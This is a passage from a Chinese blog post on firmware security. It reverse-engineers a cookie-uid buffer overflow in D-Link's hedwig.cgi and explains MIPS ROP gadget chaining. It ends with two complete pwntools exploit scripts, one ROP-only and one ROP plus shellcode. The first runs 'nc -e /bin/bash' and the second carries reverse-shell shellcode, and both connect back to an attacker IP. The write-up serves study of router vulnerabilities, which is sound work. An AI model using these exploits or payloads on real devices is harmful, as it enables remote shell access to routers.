signature!&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>首先获取环境变量REQUEST_METHOD,并且可以判断必须是post方法</p>
<p>然后进入cgibin_parse_request,该函数用于进一步处理http请求</p>
<p>在其中又会要求三个环境变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( getenv(<span class="string">&quot;CONTENT_TYPE&quot;</span>) &amp;&amp; (v6 = getenv(<span class="string">&quot;CONTENT_LENGTH&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">  v7 = atoi(v6);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">v21 = sobj_new();</span><br><span class="line">v8 = sobj_new();</span><br><span class="line">v22 = v8;</span><br><span class="line">v9 = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( v21 &amp;&amp; v8 )</span><br><span class="line">&#123;</span><br><span class="line">  v10 = getenv(<span class="string">&quot;REQUEST_URI&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>虽然对漏洞利用没什么影响,但依然需要传递这些</p>
<p><code>sobj</code>是<code>stringobject</code>的缩写,这一系列的函数都是针对字符串的</p>
<p>一种可能的实现如下<a target="_blank" rel="noopener" href="https://github.com/coolshou/DIR-850L_A1/blob/master/comlib/strobj.c">DIR-850L_A1/comlib/strobj.c at master · coolshou/DIR-850L_A1 (github.com)</a></p>
<p>之后不必多做关注,继续走到一个关键函数sess_get_uid</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *v5;</span><br><span class="line">    <span class="keyword">if</span> ( !*v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      sobj_free(v2);</span><br><span class="line">      sobj_free(v4);</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v7 != <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sobj_add_char(v2, v7);</span><br><span class="line">          v6 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      sobj_add_char(v4, *v5++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">LABEL_18:</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>其用于获得uid，<code>=</code>前面的内容被存入了<code>v2</code>，后面的内容被存入了<code>v4</code>，最后会对<code>v2</code>中的内容进行一个判断：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="built_in">string</span> = (<span class="type">char</span> *)sobj_get_string(v4);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_27:</span><br><span class="line">  <span class="built_in">string</span> = getenv(<span class="string">&quot;REMOTE_ADDR&quot;</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">  result = sobj_add_string(a1, <span class="built_in">string</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">    result = sobj_del(v2);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">return</span> sobj_del(v4);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<p>也就是判断等号前的内容是否为<code>uid</code>，判断通过了以后，就会将等号后面的字符串拼接入<code>a1</code>，也就是主函数传进来的参数<code>v4</code>。</p>
<p>再然后就到了一个非常关键的点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sess_get_uid(v4);</span><br><span class="line"><span class="built_in">string</span> = (<span class="type">const</span> <span class="type">char</span> *)sobj_get_string(v4);</span><br><span class="line"><span class="built_in">sprintf</span>(v27, <span class="string">&quot;%s/%s/postxml&quot;</span>, <span class="string">&quot;/runtime/session&quot;</span>, <span class="built_in">string</span>);</span><br></pre></td></tr></table></figure>
<p>这里的<code>string</code>就是<code>v4</code>中的字符串，也<strong>就是<code>cookie</code>中<code>uid=</code>之后的内容</strong>，是可以由用户自由控制的，然而<code>v27</code>数组的大小仅有<code>1024</code>，因此，很容易造成缓冲区溢出。</p>
<p>在之后还有一个类似的<code>sprintf</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v20 = (<span class="type">const</span> <span class="type">char</span> *)sobj_get_string(v4);</span><br><span class="line"><span class="built_in">sprintf</span>(v27, <span class="string">&quot;/htdocs/webinc/fatlady.php\nprefix=%s/%s&quot;</span>, <span class="string">&quot;/runtime/session&quot;</span>, v20);</span><br></pre></td></tr></table></figure>
<p>这里的<code>string</code>仍然是<code>v4</code>，进一步观察，<strong>发现<code>v4</code>在两个<code>sprintf</code>之间未被改变过</strong>，也就是说，这里的<code>string</code>仍然是<code>cookie</code>中<code>uid=</code>后面的字符串，如果能走到这第二个<code>sprintf</code>的话，那么这里才是真正的溢出漏洞点，因为仍然是<code>v27</code>数组的溢出，两次拼接的字符串又一样，所以这里能覆盖上一次<code>sprintf</code>的内容。</p>
<p>容易看出，如果能走到第二个<code>sprintf</code>的话，就需要过这两个判断：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !v7 )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = <span class="string">&quot;unable to open temp file.&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !haystack )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = <span class="string">&quot;no xml data.&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这第一个判断需要有<code>/var/tmp</code>这个目录，这个<strong>在真机上是有的</strong>，因此为了更真实地模拟环境，我们需要在解压后得到的文件系统内创建一个<code>/var/tmp</code>文件夹，这样<code>cgibin</code>才能在此路径下创建<code>temp.xml</code>文件用于数据的写入。</p>
<p>第二个判断<code>haystack</code>的值在这之前只有<code>cgibin_parse_request</code>的第一个参数<code>sub_409A6C</code>中可对其操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sub_409A6C</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( haystack )</span><br><span class="line">    <span class="built_in">free</span>(haystack);</span><br><span class="line">  result = (<span class="type">char</span> *)sobj_strdup(*(_DWORD *)(a2 + <span class="number">4</span>));</span><br><span class="line">  haystack = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个<code>sub_409A6C</code>函数<strong>需要<code>POST</code>传入内容</strong>的时候才能走到，那么就要使得<code>POST</code>传入内容</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>mips架构不同于x86能够直接进行跳转,其存在一些硬性要求</p>
<p>我们看system的开头</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00053200</span> <span class="number">02</span> <span class="number">00</span> <span class="number">1</span>C <span class="number">3</span>C E0 <span class="number">32</span> <span class="number">9</span>C <span class="number">27</span>       li      $gp, (_GLOBAL_OFFSET_TABLE_+<span class="number">0x7FF0</span> - .)  # Alternative name is <span class="string">&#x27;__libc_system&#x27;</span></span><br><span class="line">.text:<span class="number">00053208</span> <span class="number">21</span> E0 <span class="number">99</span> <span class="number">03</span>                   addu    $gp, $t9</span><br></pre></td></tr></table></figure>
<p>由于之后许多操作会使用到gp,所以这里<code>$t9</code>必须要是system的地址(<strong>这点算是非常通用的</strong>,因为gp寄存器的值被用来定位静态数据区域，所以要保证gp寄存器不会出错)</p>
<p>因此跳转到某个函数的时候，一定要通过<code>jalr $t9</code>类似的<code>gadget</code>进行跳转才行。</p>
<p>我们发现，最后的返回的时候，得是<strong>通过<code>$ra</code>寄存器中的地址跳转</strong>的，也就是说，我们在跳转到这个函数之前，就也得控制好<code>$ra</code>寄存器中的地址为我们跳转后执行完该函数，再下一个跳转到的地方。很方便的是，我们发现<code>move $t9, ...</code>这样的<code>gadget</code>之后，通常会有<code>lw $ra, ...</code>这样的<code>gadget</code>，最后再<code>jr $t9</code>，这类<code>gadget</code><strong>可以通过<code>mipsrop.tail()</code>来进行查找</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00040640                               loc_40640:                               # CODE XREF: sub_405EC+34↑j</span><br><span class="line">.text:00040640 21 28 00 02                   move    $a1, $s0</span><br><span class="line">.text:00040644 21 C8 20 02                   move    $t9, $s1</span><br><span class="line">.text:00040648 24 00 BF 8F                   lw      $ra, 0x1C+var_s8($sp)</span><br><span class="line">.text:0004064C 20 00 B1 8F                   lw      $s1, 0x1C+var_s4($sp)</span><br><span class="line">.text:00040650 1C 00 B0 8F                   lw      $s0, 0x1C+var_s0($sp)</span><br><span class="line">.text:00040654 94 23 84 24                   addiu   $a0, 0x2394</span><br><span class="line">.text:00040658 08 00 20 03                   jr      $t9</span><br><span class="line">.text:0004065C 28 00 BD 27                   addiu   $sp, 0x28</span><br></pre></td></tr></table></figure>
<p>此外还需要注意这里system的最低字节恰好是<code>\x00</code>,所以最好跳转其之前(刚好是几个<code>\x00</code>在mips中是nop)</p>
<p>第一个问题解决,现在第二个如何控制参数</p>
<p>我们想要一个<code>addiu $a0, $sp, ...</code>的<code>gadget</code>，但是这样的<code>gadget</code>一般来说没有能满足我们要求的，之后的跳转大多都不太方便。</p>
<p>于是，我们想到可以通过如<code>addiu $s0, $sp, ...</code>和<code>move $a0, $s0</code>的组合命令实现，而一些原本要跳到<code>mempcpy</code>函数的地方，由于<code>mempcpy</code>函数的特性，恰好会同时包含上面两个<code>gadget</code>，也就不需要分两次跳转了，一段<code>gadget</code>就能搞定，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00015B68 AC 02 C5 8F                   lw      $a1, 0x280+arg_4($fp)</span><br><span class="line">.text:00015B6C 18 00 B2 27                   addiu   $s2, $sp, 0x280+var_268</span><br><span class="line">.text:00015B70 21 30 60 00                   move    $a2, $v1</span><br><span class="line">.text:00015B74 21 C8 00 02                   move    $t9, $s0</span><br><span class="line">.text:00015B78 09 F8 20 03                   jalr    $t9 ; mempcpy</span><br><span class="line">.text:00015B7C 21 20 40 02                   move    $a0, $s2</span><br></pre></td></tr></table></figure>
<p>这里由于上面所说的流水线指令集的特性，在跳转到<code>t9</code>之前，其第一个参数<code>$a0</code>就已经被赋为<code>$s2</code>了。</p>
<p>至此两个问题解决</p>
<p>exp来自winmt大佬</p>
<p><strong>rop:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.192.131 8888&#x27;</span></span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x53200</span> - <span class="number">1</span>) <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x169C4</span>) <span class="comment"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x32A98</span>) <span class="comment"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.192.133:1234/hedwig.cgi&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;winmt&quot;</span> : <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;11&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p><strong>rop+shellcode</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x436D0</span>) <span class="comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x56BD0</span>) <span class="comment"># s3  sleep</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">5</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x57E50</span>) <span class="comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span></span><br><span class="line"> </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x37E6C</span>) <span class="comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x3B974</span>) <span class="comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span></span><br><span class="line"> </span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a0, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a0, $zero, 0x1111</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFFD</span></span><br><span class="line"><span class="string">    not $a0, $t4</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFFD</span></span><br><span class="line"><span class="string">    not $a0, $t4</span></span><br><span class="line"><span class="string">    not $a1, $t4</span></span><br><span class="line"><span class="string">    slti $a2, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4183</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    andi $a0, $v0, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4041</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string">    li $v0, 4041</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $a1, 0xB821 # Port: 8888</span></span><br><span class="line"><span class="string">    ori $a1, 0xFF01</span></span><br><span class="line"><span class="string">    addi $a1, $a1, 0x0101</span></span><br><span class="line"><span class="string">    sw $a1, -8($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $a1, 0x83C0A8C0 # IP: 192.168.192.131</span></span><br><span class="line"><span class="string">    sw $a1, -4($sp)</span></span><br><span class="line"><span class="string">    addi $a1, $sp, -8</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFEF</span></span><br><span class="line"><span class="string">    not $a2, $t4</span></span><br><span class="line"><span class="string">    li $v0, 4170</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $t0, 0x6962</span></span><br><span class="line"><span class="string">    ori $t0, $t0,0x2f2f</span></span><br><span class="line"><span class="string">    sw $t0, -20($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $t0, 0x6873</span></span><br><span class="line"><span class="string">    ori $t0, 0x2f6e</span></span><br><span class="line"><span class="string">    sw $t0, -16($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a3, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    sw $a3, -12($sp)</span></span><br><span class="line"><span class="string">    sw $a3, -4($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    addi $a0, $sp, -20</span></span><br><span class="line"><span class="string">    addi $t0, $sp, -20</span></span><br><span class="line"><span class="string">    sw $t0, -8($sp)</span></span><br><span class="line"><span class="string">    addi $a1, $sp, -8</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    addiu $sp, $sp, -20</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a2, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += shellcode</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.192.133:1234/hedwig.cgi&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;winmt&quot;</span> : <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;11&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>最终成功getshell</p>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>固件安全初识</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://ixout.github.io/posts/3834/">https://ixout.github.io/posts/3834/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>ixout</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2024-02-29</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-05-15</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/iot/">iot</a><a class="post-meta__tags" href="/tags/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/">固件分析</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/indeximg.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/49884/" title="关于流与正反连shell"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2cc667bb30dce44a47.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">关于流与正反连shell</div></div></a></div><div class="next-post pull-right"><a href="/posts/53436/" title="windows pwn"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/8373377e69c3499d90.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">windows pwn</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-author"><div class="item-headline"><i class="fa-solid fa-circle-user"></i><span>Author</span></div><div class="author-main-content"><div class="author-check-content"><label class="author-info" for="author-info">     <input id="author-info" type="checkbox" name="author-info"/><div class="author-avatar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 